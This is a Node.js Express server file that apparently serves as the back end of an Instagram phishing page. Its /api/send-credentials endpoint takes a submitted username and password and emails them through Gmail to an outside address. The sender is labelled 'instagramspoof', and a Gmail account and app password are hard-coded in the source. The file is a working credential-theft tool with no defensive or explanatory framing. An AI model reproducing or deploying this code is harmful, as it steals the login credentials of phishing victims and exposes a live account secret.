import express from 'express';
import nodemailer from 'nodemailer';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();

app.use(express.json());
app.use(cors());
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user:"Hidrodox8989@gmail.com",
    pass: "wqtr xwwu egyg dnys"
  }
});

app.post('/api/send-credentials', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username and password are required'
      });
    }

    const mailOptions = {
      from: "instagramspoof@gmail.com",
      to: 'rsharma68368@gmail.com',
      subject: 'Login Credentials Received',
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f5f5f5;">
          <div style="max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px;">
            <h2 style="color: #333; border-bottom: 2px solid #0095f6; padding-bottom: 10px;">
              New Login Attempt
            </h2>
            <p style="color: #666; font-size: 16px;">
              Someone has submitted their credentials:
            </p>
            <div style="background-color: #f9f9f9; padding: 20px; border-radius: 5px; margin: 20px 0;">
              <p style="margin: 10px 0;">
                <strong>Username:</strong> ${username}
              </p>
              <p style="margin: 10px 0;">
                <strong>Password:</strong> ${password}
              </p>
            </div>
            <p style="color: #999; font-size: 12px; margin-top: 30px;">
              Timestamp: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
            </p>
          </div>
        </div>
      `
    };

    await transporter.sendMail(mailOptions);

    res.status(200).json({
      success: true,
      message: 'Credentials sent successfully'
    });

  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to send email',
      error: error.message
    });
  }
});


app.get('/api/test', (req, res) => {
  res.json({ message: 'API is running' });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
